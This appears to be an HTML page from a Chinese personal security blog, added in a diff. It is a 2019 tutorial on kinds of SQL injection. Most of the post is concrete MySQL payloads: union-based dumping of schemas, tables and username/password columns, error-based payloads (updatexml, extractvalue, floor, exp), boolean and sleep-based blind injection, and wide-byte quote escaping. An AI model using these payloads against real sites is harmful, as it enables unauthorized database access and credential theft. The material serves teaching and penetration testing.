@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head><head>
+    <meta name="google-site-verification" content="9vIieCe-Qpd78QOmBl63rGtIVbhY6sYyuxX3j8XWBA4" />
+    <meta name="baidu-site-verification" content="LRrmH41lz7" />
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <meta name="description" content="star，渗透测试人员, python爱好者,生活探险家 | 这里是 Star的博客，与你一起发现更大的世界。">
+    
+    <meta name="keyword"  content="Star的网络日志, 博客, 个人网站">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>SQL注入种类-Star&#39;s Blog</title>
+
+    <link rel="canonical" href="/post/sql%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB/">
+
+    <link rel="stylesheet" href="/css/iDisqus.min.css"/>
+	
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    
+    <link rel="stylesheet" href="/css/syntax.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    
+    
+    <script src="/js/jquery.min.js"></script>
+    
+    
+    <script src="/js/bootstrap.min.js"></script>
+    
+    
+    <script src="/js/hux-blog.min.js"></script>
+	
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/styles/docco.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+    
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-133454727-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+    
+</head>
+</head>
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Star&#39;s Blog</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">主页</a>
+                    </li>
+                    
+                    <li>
+                        <a href="/categories/1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8">1网络安全</a>
+                    </li>
+                    
+                    <li>
+                        <a href="/categories/2%E8%BF%90%E7%BB%B4">2运维</a>
+                    </li>
+                    
+                    <li>
+                        <a href="/categories/3%E7%90%86%E8%B4%A2">3理财</a>
+                    </li>
+                    
+                    <li>
+                        <a href="/categories/4%E7%94%9F%E6%B4%BB">4生活</a>
+                    </li>
+                    
+                    
+		    
+                        <li><a href="/about/">5关于我</a></li>
+                    
+
+                    
+		    <li>
+                        <a href="/search">查询 <img src="/img/search.png" height="15" style="cursor: pointer;"></a>
+		    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/home-bg-jeep.jpg')
+    }
+</style>
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/sql%E6%B3%A8%E5%85%A5" title="SQL注入">
+                            SQL注入
+                        </a>
+                        
+                    </div>
+                    <h1>SQL注入种类</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+			Posted by 
+			
+			     &#34;star&#34;
+			 
+			on 
+			Sunday, February 3, 2019
+                        
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <header>
+                    <h2>TOC</h2>
+                </header>
+                <nav id="TableOfContents">
+<ul>
+<li><a href="#一-注入点的种类">一、注入点的种类</a>
+<ul>
+<li><a href="#1-基于注入点值的属性">1、基于注入点值的属性</a></li>
+<li><a href="#2-基于注入点的位置">2、基于注入点的位置</a></li>
+<li><a href="#3-基于注入的程度和顺序">3、基于注入的程度和顺序</a></li>
+<li><a href="#4-从服务器返回的响应">4、从服务器返回的响应</a></li>
+</ul></li>
+<li><a href="#二-几种类型的举例">二、几种类型的举例</a>
+<ul>
+<li><a href="#1-数字型">1、数字型</a></li>
+<li><a href="#2-字符型">2、字符型</a></li>
+<li><a href="#3-盲注">3、盲注</a></li>
+</ul></li>
+</ul>
+</nav>
+                
+                
+
+<h1 id="一-注入点的种类">一、注入点的种类</h1>
+
+<h2 id="1-基于注入点值的属性">1、基于注入点值的属性</h2>
+
+<p>数字型<br />
+字符型</p>
+
+<h2 id="2-基于注入点的位置">2、基于注入点的位置</h2>
+
+<p>GET/POST<br />
+COOKIE<br />
+HEAD型</p>
+
+<h2 id="3-基于注入的程度和顺序">3、基于注入的程度和顺序</h2>
+
+<p>一阶注入<br />
+二阶注入<br />
+注：一阶注入指注入的语句直接对web应用产生了结果，二阶注入是间接产生结果，例如存储型xss（首先将恶意输入保存在数据库中，第二次检索存储在数据库中的恶意输入，构造SQL语句），辅助别的漏洞来利用。</p>
+
+<h2 id="4-从服务器返回的响应">4、从服务器返回的响应</h2>
+
+<p>1、有回显<br />
+联合注入（可以使用union的情况下的注入。）<br />
+堆查询注入（可以同时执行多条语句的执行时的注入。）<br />
+报错注入<br />
+2、无回显<br />
+布尔盲注<br />
+延时盲注（即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。）</p>
+
+<h1 id="二-几种类型的举例">二、几种类型的举例</h1>
+
+<p>要测试注入，首先要明白各个数据库的注释
+##mysql注释:
+单行注释，#、&ndash;空格后面直接加内容
+多行注释，<code>/**/</code>中间可以跨</p>
+
+<h2 id="1-数字型">1、数字型</h2>
+
+<p>?id=1&rsquo; and 1=1#<br />
+?id=1&rsquo; and 1=2#<br />
+?id=1&rsquo; and 1=1<code>--</code>%20<br />
+?id=1&rsquo; and 1=2<code>--</code>%20<br />
+以上是判断是否存在注入<br />
+?id=1&rsquo; order by i<code>--</code>%20判断列数
+<img src="/images/order-by.jpg" alt="avatar" />
+&gt; ?id=1&rsquo; union select 1,2,3,4,5 <code>--</code>%20看回显位<br />
+&gt; ?id=1&rsquo;&nbsp;union&nbsp;select&nbsp;@@version,database(),datadir<code>--</code>%20</p>
+
+<p><img src="/images/order-by1.jpg" alt="avatar" />
+查出数据库版本、当前数据库、当前数据库的地址
+以下是mysql的系统函数：
+<img src="/images/sql1-1.jpg" alt="avatar" /></p>
+
+<p>要注入出数据库中的数据，就不得不提到mysql的系统表 information_schema</p>
+
+<pre><code class="language-**information_schema**提供了访问数据库元数据的方式，其中保存着关于MySQL服务器所维护的所有其他数据库的信息，如数据库名或表名，列的数据类型，或访问权限等。">在**INFORMATION_SCHEMA**中，有些只读表，它们实际上是视图，而不是基本表，所以无法看到与之相关的任何文件。  
+**SCHEMATA**：提供了当前mysql实例中所有数据库的信息，show databases的结果取之此表。  
+**TABLES**：提供了关于数据库中的表的信息（包括视图），详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息，show tables from schemaname的结果取之此表。  
+**COLUMNS**：提供了表中的列信息，详细表述了某张表的所有列以及每个列的信息，show columns from schemaname.tablename的结果取之此表。  
+**STATISTICS**：提供了关于表索引的信息，show index from schemaname.tablename的结果取之此表。  
+**USER_PRIVILEGES**（用户权限）：给出了关于全程权限的信息，该信息源自mysql.user授权表，是非标准表。
+**SCHEMA_PRIVILEGES**（方案权限）：给出了关于方案（数据库）权限的信息，该信息来自mysql.db授权表，是非标准表。 
+**TABLE_PRIVILEGES**（表权限）：给出了关于表权限的信息，该信息源自mysql.tables_priv授权表，是非标准表。  
+**COLUMN_PRIVILEGES**（列权限）：给出了关于列权限的信息，该信息源自mysql.columns_priv授权表，是非标准表。  
+**CHARACTER_SETS**（字符集）：提供了mysql实例可用字符集的信息，SHOW CHARACTER SET结果集取之此表。 
+**COLLATIONS**：提供了关于各字符集的对照信息。  
+**COLLATION_CHARACTER_SET_APPLICABILITY**：指明了可用于校对的字符集，这些列等效于SHOW COLLATION的前两个显示字段。  
+**TABLE_CONSTRAINTS**：描述了存在约束的表，以及表的约束类型。  
+**KEY_COLUMN_USAGE**：描述了具有约束的键列。  
+**ROUTINES**：提供了关于存储子程序（存储程序和函数）的信息，此时，ROUTINES表不包含自定义函数（UDF），名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。  
+**VIEWS**：给出了关于数据库中的视图的信息，需要有show views权限，否则无法查看视图信息。 
+**TRIGGERS**：提供了关于触发程序的信息，必须有super权限才能查看该表。
+</code></pre>
+
+<p>数据库也可以这样查询出来：<br />
+&gt; ?id=1&rsquo; and 1=2 union select 1,schema_name,3 from information_schema.schemata limit 0,1<code>--</code>%20逐个查出数据库，也可以group_concat(schema_name)一锅端</p>
+
+<p>注入出当前数据库之后就是查表（table）:<br />
+?id=1&rsquo; and 1=2 union select 1,table_name,3 from information_schema.tables where table_schema=数据库名16进制 limit 0,1<code>--</code>%20</p>
+
+<p>如法炮制查列：<br />
+?id=1&rsquo; and 1=2 union select 1,column_name,3 from information_schema.columns where table_name=表名16进制 limit 0,1<code>--</code>%20</p>
+
+<p>表、列都出来了就爆字段了：<br />
+?id=1&rsquo; and 1=2 union select 1,2,username from 库名.表名 limit 0,1<code>--</code>%20</p>
+
+<h2 id="2-字符型">2、字符型</h2>
+
+<p>注意闭合字符后面的单/双引号<br />
+?id=1&rsquo; union select username,passwd from 库名.表名 limit 0,1 #<br />
+?id=1&rdquo; union select username,passwd from 库名.表名 limit 0,1 #</p>
+
+<p>报错涉及到如下几个函数：<br />
+updatexml()  报错
+extractvalue() 报错<br />
+floor()、count(<code>*</code>）、random()报错<br />
+name_const() 报错<br />
+exp()函数</p>
+
+<p><strong>（1）UPDATEXML(XML_document, XPath_string, new_value)</strong>
+限制了最大长度为32
+select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))
+替换select user部分的语句<br />
+<strong>（2）EXTRACTVALUE(XML_document, XPath_string)</strong>
+限制了最大长度为32
+select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))<br />
+<strong>（3）floor()、count()、random()报错</strong>
+公式：username=admin&rsquo; and (select 1 from (select count(), concat(floor(rand(0)2),0x23,(你想获取的数据的sql语句))x from information_schema.tables group by x )a) and &lsquo;1&rsquo; = &lsquo;1<br />
+<strong>（4）name_const()</strong>
+低版本，数据重复报错
+name_const()函数是MYSQL5.0.12版本加入的一个返回给定值的函数。当用来产生一个结果集合列时 , NAME_CONST() 促使该列使用给定名称。
+select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x
+<img src="/images/sql1-2.png" alt="avatar" />
+（5）、exp()函数<br />
+mysql&gt;5.5.5<br />
+exp(x):计算e的x次方<br />
+Payload: and (EXP(~(select * from(select version())a)))<br />
+Exp()超过710会产生溢出。<br />
+将0按位取反就会返回“18446744073709551615”，而函数执行成功会返回0，所以将成功执行的函数取反就会得到最大的无符号BIGINT值，从而造成报错。</p>
+
+<h2 id="3-盲注">3、盲注</h2>
+
+<p>（1）、true/false<br />
+页面显示就2种情况，正确或错误<br />
+length()<br />
+substr()<br />
+ascii()<br />
+and ascii(substr((select schema_name from information_schema.schemata limit 2,1),1,1))&gt;101 %23 limit</p>
+
+<p>（2）、基于时间的
+根据时间线来判断，涉及到的函数：
+Sleep(int time)，执行将程序（进程）挂起一段时间，毫秒;
+if（expr1，ecpr2，expr3）判断语句;
+and if(ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1))&gt;100,1,sleep(3))%23
+采用二分法逐个字母猜解
+cookie、referer头、user-agent头：
+<img src="/images/sql1-3.png" alt="avatar" />
+注入点变了，抓包注入，方法和上述相似</p>
+
+<p>5、宽字节：
+gbk     一个汉字2个字节
+utf-8   一个汉字3个字节
+mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）
+如：
+?id=1 %df&rsquo;&mdash;&gt;?id=1 %df&rsquo;&mdash;&gt;?id=1%df%5c&rsquo;&mdash;-&gt;?id=1字&rsquo;     单引号就逃逸了出来
+根据gbk编码，第一个字节ascii码大于128，基本上就可以了。比如我们不用%df，用%a1也可以
+把这个思路扩展到世界上所有多字节编码，我们可以这样认为：只要低位的范围中含有0x5c的编码，就可以进行宽字符注入。
+参考：<a href="https://www.cnblogs.com/lcamry/articles/5625276.html">https://www.cnblogs.com/lcamry/articles/5625276.html</a></p>
+
+
+                
+                
+<div class="entry-shang text-center">
+    
+	    <p>「真诚赞赏，手留余香」</p>
+	
+	<button class="zs show-zs btn btn-bred">赞赏支持</button>
+</div>
+<div class="zs-modal-bg"></div>
+<div class="zs-modal-box">
+	<div class="zs-modal-head">
+		<button type="button" class="close">×</button>
+		<span class="author"><a href="https://star-safe.github.io"><img src="/img/favicon.png" />Star&#39;s Blog</a></span>
+        
+	        <p class="tip"><i></i><span>真诚赞赏，手留余香</span></p>
+		
+ 
+	</div>
+	<div class="zs-modal-body">
+		<div class="zs-modal-btns">
+			<button class="btn btn-blink" data-num="2">2元</button>
+			<button class="btn btn-blink" data-num="5">5元</button>
+			<button class="btn btn-blink" data-num="10">10元</button>
+			<button class="btn btn-blink" data-num="50">50元</button>
+			<button class="btn btn-blink" data-num="100">100元</button>
+			<button class="btn btn-blink" data-num="1">任意金额</button>
+		</div>
+		<div class="zs-modal-pay">
+			<button class="btn btn-bred" id="pay-text">2元</button>
+			<p>使用<span id="pay-type">微信</span>扫描二维码完成支付</p>
+			<img src="/img/reward/wechat-2.png"  id="pay-image"/>
+		</div>
+	</div>
+	<div class="zs-modal-footer">
+		<label><input type="radio" name="zs-type" value="wechat" class="zs-type" checked="checked"><span ><span class="zs-wechat"><img src="/img/reward/wechat-btn.png"/></span></label>
+		<label><input type="radio" name="zs-type" value="alipay" class="zs-type" class="zs-alipay"><img src="/img/reward/alipay-btn.png"/></span></label>
+	</div>
+</div>
+<script type="text/javascript" src="/js/reward.js"></script>
+
+                
+
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/post/sql%E6%B3%A8%E5%85%A5bypass/" data-toggle="tooltip" data-placement="top" title="SQL注入绕过">&larr;
+                            Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/post/xss/" data-toggle="tooltip" data-placement="top" title="XSS知识">Next
+                            Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                
+<div id="disqus-comment"></div>
+
+<script src="/js/iDisqus.js"></script>
+<script>
+var disq = new iDisqus('disqus-comment', {
+    forum: 'star-safe',
+    api: 'https:\/\/shadowocean.com\/disqus\/api\/',
+	site: '',
+    mode: 1,
+    timeout: 5000,
+    init: true
+});
+</script>
+
+
+
+            </div>
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        <a href="/tags/sql%E6%B3%A8%E5%85%A5" title="SQL注入">
+                            SQL注入
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/tag1" title="tag1">
+                            tag1
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+                <section>
+                    <hr>
+                    <h5>友链</h5>
+                    <ul class="list-inline">
+                        
+                        <li><a target="_blank" href="https://pyocean.com">进击的ROBOT</a></li>
+                        
+                    </ul>
+                </section>
+                
+                </script>
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+<footer>
+    <div class="container">
+<div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+<ul class="list-inline text-center">
+   
+   <li>
+       <a href="" rel="alternate" type="application/rss+xml" title="Star&#39;s Blog" >
+   <span class="fa-stack fa-lg">
+       <i class="fa fa-circle fa-stack-2x"></i>
+       <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+   </span>
+       </a>
+   </li>
+   
+    
+    <li>
+<a href="mailto:hfjstar@gmail.com">
+    <span class="fa-stack fa-lg">
+<i class="fa fa-circle fa-stack-2x"></i>
+<i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+    </span>
+</a>
+    </li>
+		    
+    
+    
+    
+    
+
+    
+
+		    
+    
+    
+    <li>
+<a target="_blank" href="https://github.com/star-safe">
+    <span class="fa-stack fa-lg">
+<i class="fa fa-circle fa-stack-2x"></i>
+<i class="fa fa-github fa-stack-1x fa-inverse"></i>
+    </span>
+</a>
+    </li>
+		    
+    
+    
+</ul>
+		<p class="copyright text-muted">
+    Copyright &copy; Star&#39;s Blog , 2019
+    <br>
+                    <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true" >
+                    </iframe>
+</p>
+    </div>
+</div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+  o = d.createElement(t),
+  s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+async("/js/jquery.tagcloud.js",function(){
+    $.fn.tagcloud.defaults = {
+
+color: {start: '#bbbbee', end: '#0085a1'},
+    };
+    $('#tag_cloud a').tagcloud();
+})
+    }
+</script>
+
+
+<script>
+    async("https://cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.js", function(){
+var $nav = document.querySelector("nav");
+if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<script>
+    (function(){
+var bp = document.createElement('script');
+var curProtocol = window.location.protocol.split(':')[0];
+if (curProtocol === 'https'){
+       bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else{
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+var s = document.getElementsByTagName("script")[0];
+s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+
+
+
+
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-133454727-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+</body>
+</html>
